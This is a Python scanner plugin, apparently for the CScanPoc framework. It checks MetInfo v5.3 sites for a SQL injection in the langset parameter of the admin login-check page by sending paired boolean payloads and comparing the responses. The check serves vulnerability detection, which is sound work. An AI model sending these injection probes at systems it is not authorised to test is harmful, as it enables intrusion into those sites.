# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.error
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'MetInfo_0002'  # 平台漏洞编号，留空
    name = 'MetInfo v5.3sql注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-03-12'  # 漏洞公布时间
    desc = '''
        metinfo v5.3 存在一参数未过滤存在sql注入漏洞。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'MetInfo'  # 漏洞应用名称
    product_version = 'v5.3'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '783ae58b-fe8d-45bf-bcd4-0a08c5130fb1'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            true_url = self.target + "/admin/login/login_check.php?langset=cn" + \
                urllib.parse.quote("' and '1' ='1")
            false_url = self.target + "/admin/login/login_check.php?langset=cn" + \
                urllib.parse.quote("' and '1' ='2")
            code1, head1, res1, errcode1, _ = hh.http(true_url)
            code2, head2, res2, errcode2, _ = hh.http(false_url)

            if 'not have this language' in res2 and 'not have this language' not in res1:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
